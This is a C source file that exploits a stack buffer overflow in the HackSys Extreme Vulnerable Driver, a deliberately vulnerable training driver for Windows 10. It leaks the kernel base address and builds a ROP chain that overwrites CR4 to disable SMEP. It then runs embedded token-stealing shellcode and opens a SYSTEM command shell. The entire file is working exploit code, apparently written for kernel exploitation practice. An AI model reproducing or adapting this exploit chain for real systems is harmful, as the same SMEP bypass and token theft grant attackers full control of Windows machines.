#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>

#define DRIVER "\\\\.\\HacksysExtremeVulnerableDriver"
#define IOCTL_CODE 0x222003

unsigned long long GetKernelBase(void)
{

    LPVOID  lpImageBase[1024];
    DWORD   lpcbNeeded;

    /* Get base address of first driver (ntoskrnl.exe) */
    printf("[+] Obtaining Driver Base Address!\n");
    BOOL DriversBase = EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);
    if (!DriversBase)
    {
        printf("[!] FATAL: Error enumerating device drivers!\n");
        exit(1);
    }

    /* Get name of first driver (ntoskrnl.exe) */
    char BaseName[1024] = {0};
    BOOL DriversBaseName = GetDeviceDriverBaseNameA(lpImageBase[0], BaseName, sizeof(BaseName));
    if (!DriversBaseName)
    {
        printf("[!] FATAL: Error getting drivers base name!\n");
        exit(1);
    }

    /* 
     * ntoskrnl.exe is the first module in lpImageBase.
     * typecast LPVOID -> unsigned long long
    */
    unsigned long long KernelBase = (unsigned long long)lpImageBase[0];

    printf("[*] Driver base name is: %s\n", BaseName);
    printf("[*] %s is located at: 0x%p\n", BaseName, KernelBase);

    return KernelBase;

}

unsigned long long CreateShellcode(void)
{
    /*
		_start:
			mov rax, [gs:0x188]		    ; Current thread (_KTHREAD)
			mov rax, [rax + 0xb8]		; Current process (_EPROCESS)
			mov rbx, rax			    ; Copy current process (_EPROCESS) to rbx
		__loop:
			mov rbx, [rbx + 0x2f0] 		; ActiveProcessLinks
			sub rbx, 0x2f0		   	    ; Go back to current process (_EPROCESS)
			mov rcx, [rbx + 0x2e8] 		; UniqueProcessId (PID)
			cmp rcx, 4 			        ; Compare PID to SYSTEM PID 
			jnz __loop			        ; Loop until SYSTEM PID is found
			mov rcx, [rbx + 0x358]		; SYSTEM token is @ offset _EPROCESS + 0x358
			and cl, 0xf0			    ; Clear out _EX_FAST_REF RefCnt
			mov [rax + 0x358], rcx		; Copy SYSTEM token to current process
			add rsp, 0x40			    ; Restore execution
			ret	
	*/
	
	// Windows 10 RS1 offsets in _EPROCESS structure
	char payload[] = "\x65\x48\x8B\x04\x25\x88\x01\x00\x00\x48\x8B\x80"
			         "\xB8\x00\x00\x00\x48\x89\xC3\x48\x8B\x9B\xF0"
			         "\x02\x00\x00\x48\x81\xEB\xF0\x02\x00\x00\x48"
			         "\x8B\x8B\xE8\x02\x00\x00\x48\x83\xF9\x04"
			         "\x75\xE5\x48\x8B\x8B\x58\x03\x00\x00\x80"
			         "\xE1\xF0\x48\x89\x88\x58\x03\x00\x00\x48"
			         "\x83\xC4\x40\xC3";

    /* Allocate shellcode in user mode */
    LPVOID shellcode = VirtualAlloc(NULL, sizeof(payload), 0x3000, 0x40);
    if (!shellcode)
    {
        printf("[-] FATAL: Unable to allocate shellcode!\n");
        exit(1);
    }
    printf("[+] Shellcode allocated at: 0x%p\n", shellcode);

    /* Move allocated space in user mode */
    BOOL MoveMem = RtlMoveMemory(shellcode, payload, sizeof(payload));
    if(!MoveMem)
    {
        printf("[-] FATAL: Unable to move shellcode into allocated memory!\n");
    }

    unsigned long long ShellcodeBase = (unsigned long long)shellcode;
    return ShellcodeBase;
}

void exploit(void)
{
    HANDLE  DriverHandle;
    DWORD   OldProtect;
    char    buffer[2100] = {0};

    unsigned long long BaseAddress = GetKernelBase();
    unsigned long long shellcode = CreateShellcode();

    unsigned long long ROP1 = BaseAddress + 0x6a0a51;   // 0x1406a0a51: pop rcx ; ret      : ntoskrnl.exe
    unsigned long long ROP2 = 0x70678;                  // Updated CR4
    unsigned long long ROP3 = BaseAddress + 0x9a41e3;   // 0x1409a41e3: mov cr4, rcx ; ret : ntoskrnl.exe

    /* Fill exploit buffer with As. */
    memset(buffer, 0x41, sizeof(buffer));

    printf("[+] Beginning ROP chain to disable SMEP!\n");
    memcpy(&buffer[2072], &ROP1, 8);
    memcpy(&buffer[2072+8], &ROP2, 8);
    memcpy(&buffer[2072+16], &ROP3, 8);
    printf("[*] SMEP should now be disabled!\n");

    memcpy(&buffer[2072+24], &shellcode, 8);
    printf("[+] Executing shellcode!\n");

    printf("[*] Opening handle to %s\n", DRIVER);
    DriverHandle = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (DriverHandle == INVALID_HANDLE_VALUE) 
    {
        printf("[!] FATAL: Could not open HEVD handle!\n");
        return;
    }

    if (!DeviceIoControl(DriverHandle, IOCTL_CODE, buffer, sizeof(buffer), NULL, 0, NULL, NULL))
    {
        printf("[!] FATAL: Error sending IOCTL to driver!\n");
        return;
    }

}

int main()
{
    printf("[+] HEVD: Stack Buffer Overflow!\n");
    exploit();

    system("cmd.exe /c cmd.exe /K cd C:\\");
    printf("[*] 1337 System Shell Bozo");

    return 0;
}
